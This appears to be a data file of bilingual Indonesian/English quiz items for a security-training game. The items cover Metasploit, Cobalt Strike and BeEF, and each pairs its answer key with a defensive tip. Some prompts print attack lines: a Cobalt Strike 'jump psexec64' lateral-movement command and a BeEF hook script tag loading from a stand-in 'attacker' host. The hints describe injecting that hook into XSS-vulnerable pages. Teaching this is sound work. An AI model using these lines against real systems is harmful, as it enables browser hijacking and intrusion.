('god','guess','Apa fungsi dari Metasploit Framework?','What is Metasploit Framework used for?','// Metasploit Framework — Exploitation Framework','bash','["Mesin pencari yang mengindeks perangkat terhubung internet (server, kamera, IoT) beserta bannernya.","Meracuni respons LLMNR/NBT-NS di jaringan lokal untuk menangkap hash kredensial Windows.","Framework untuk mengembangkan, menguji, dan menjalankan exploit terhadap target yang rentan.","Mengekstrak kredensial (password, hash, tiket Kerberos) dari memori Windows."]'::jsonb,'["A search engine that indexes internet-connected devices (servers, cameras, IoT) along with their banners.","Poisons LLMNR/NBT-NS responses on a local network to capture Windows credential hashes.","A framework for developing, testing, and running exploits against vulnerable targets.","Extracts credentials (passwords, hashes, Kerberos tickets) from Windows memory."]'::jsonb,2,'Metasploit Framework: Framework untuk mengembangkan, menguji, dan menjalankan exploit terhadap target yang rentan.','Metasploit Framework: A framework for developing, testing, and running exploits against vulnerable targets.','Metasploit Framework adalah kategori "Exploitation Framework".','Metasploit Framework falls under the "Exploitation Framework" category.','Cari modul exploit yang cocok, set opsi RHOSTS/payload, lalu jalankan untuk mendapat akses.','Find a matching exploit module, set RHOSTS/payload options, then run it to gain access.','Sistem yang rutin di-patch menutup celah sebelum exploit publik sempat dipakai menyerangnya.','Regularly patched systems close the hole before a public exploit can be used against them.'),
('god','guess','Tools apa yang dipakai di sini?','Which tool is being used here?','[TOOL] jump psexec64 TARGET-PC smb','bash','["Maltego","Cobalt Strike","Responder","Empire"]'::jsonb,'["Maltego","Cobalt Strike","Responder","Empire"]'::jsonb,1,'Cobalt Strike (Adversary Simulation / C2): Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team.','Cobalt Strike (Adversary Simulation / C2): A command-and-control platform for simulating APT-style attacks in red team exercises.','Tools ini bernama Cobalt Strike, fungsinya: Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team.','This tool is called Cobalt Strike, and it: A command-and-control platform for simulating APT-style attacks in red team exercises.','Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.','Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network.','Segmentasi jaringan membatasi seberapa jauh penyerang bisa ''lompat'' walau satu host sudah dikuasai.','Network segmentation limits how far an attacker can move even after one host is compromised.'),
('god','fill','Lengkapi perintah Cobalt Strike berikut:','Complete the following Cobalt Strike command:','beacon> ____ psexec64 TARGET-PC smb','bash','["pivot","hop","jump","relay"]'::jsonb,'["pivot","hop","jump","relay"]'::jsonb,2,'Bagian yang hilang adalah "jump". Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.','The missing part is "jump". Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network.','Cobalt Strike dipakai untuk: Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team.','Cobalt Strike is used to: A command-and-control platform for simulating APT-style attacks in red team exercises.','Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.','Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network.','Segmentasi jaringan membatasi seberapa jauh penyerang bisa ''lompat'' walau satu host sudah dikuasai.','Network segmentation limits how far an attacker can move even after one host is compromised.'),
('god','guess','Apa fungsi dari Cobalt Strike?','What is Cobalt Strike used for?','// Cobalt Strike — Adversary Simulation / C2','bash','["Framework untuk membuat simulasi serangan rekayasa sosial seperti phishing dan klon situs login.","Memecahkan hash password dengan kecepatan tinggi memakai daya komputasi GPU.","Framework command-and-control pasca-eksploitasi berbasis PowerShell/Python untuk persistensi akses.","Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team."]'::jsonb,'["A framework for simulating social-engineering attacks like phishing and cloned login pages.","Cracks password hashes at high speed using GPU compute power.","A PowerShell/Python-based post-exploitation C2 framework for maintaining access persistence.","A command-and-control platform for simulating APT-style attacks in red team exercises."]'::jsonb,3,'Cobalt Strike: Platform command-and-control untuk mensimulasikan serangan APT dalam latihan red team.','Cobalt Strike: A command-and-control platform for simulating APT-style attacks in red team exercises.','Cobalt Strike adalah kategori "Adversary Simulation / C2".','Cobalt Strike falls under the "Adversary Simulation / C2" category.','Deploy beacon ke host korban, lalu kendalikan lewat Team Server untuk gerak lateral di jaringan.','Deploy a beacon to the victim host, then control it via the Team Server to move laterally in the network.','Segmentasi jaringan membatasi seberapa jauh penyerang bisa ''lompat'' walau satu host sudah dikuasai.','Network segmentation limits how far an attacker can move even after one host is compromised.'),
('god','guess','Tools apa yang dipakai di sini?','Which tool is being used here?','<script src="http://attacker/hook.js"></script>','bash','["Nessus","Maltego","BeEF","Hashcat"]'::jsonb,'["Nessus","Maltego","BeEF","Hashcat"]'::jsonb,2,'BeEF (Browser Exploitation): Mengendalikan browser korban yang sudah ''dikaitkan'' lewat XSS untuk eksplorasi lebih lanjut.','BeEF (Browser Exploitation): Controls a victim''s ''hooked'' browser via XSS for further exploration.','Tools ini bernama BeEF, fungsinya: Mengendalikan browser korban yang sudah ''dikaitkan'' lewat XSS untuk eksplorasi lebih lanjut.','This tool is called BeEF, and it: Controls a victim''s ''hooked'' browser via XSS for further exploration.','Suntikkan hook.js ke halaman rentan XSS, lalu kendalikan browser korban dari panel BeEF.','Inject hook.js into an XSS-vulnerable page, then control the victim''s browser from the BeEF panel.','Content Security Policy (CSP) yang ketat mencegah script asing seperti ini dimuat sama sekali.','A strict Content Security Policy (CSP) prevents a foreign script like this from loading at all.'),
('god','fill','Lengkapi perintah BeEF berikut:','Complete the following BeEF command:','<script src="http://attacker/____"></script>','bash','["beef.js","hook.php","exploit.js","hook.js"]'::jsonb,'["beef.js","hook.php","exploit.js","hook.js"]'::jsonb,3,'Bagian yang hilang adalah "hook.js". Suntikkan hook.js ke halaman rentan XSS, lalu kendalikan browser korban dari panel BeEF.','The missing part is "hook.js". Inject hook.js into an XSS-vulnerable page, then control the victim''s browser from the BeEF panel.','BeEF dipakai untuk: Mengendalikan browser korban yang sudah ''dikaitkan'' lewat XSS untuk eksplorasi lebih lanjut.','BeEF is used to: Controls a victim''s ''hooked'' browser via XSS for further exploration.','Suntikkan hook.js ke halaman rentan XSS, lalu kendalikan browser korban dari panel BeEF.','Inject hook.js into an XSS-vulnerable page, then control the victim''s browser from the BeEF panel.','Content Security Policy (CSP) yang ketat mencegah script asing seperti ini dimuat sama sekali.','A strict Content Security Policy (CSP) prevents a foreign script like this from loading at all.'),
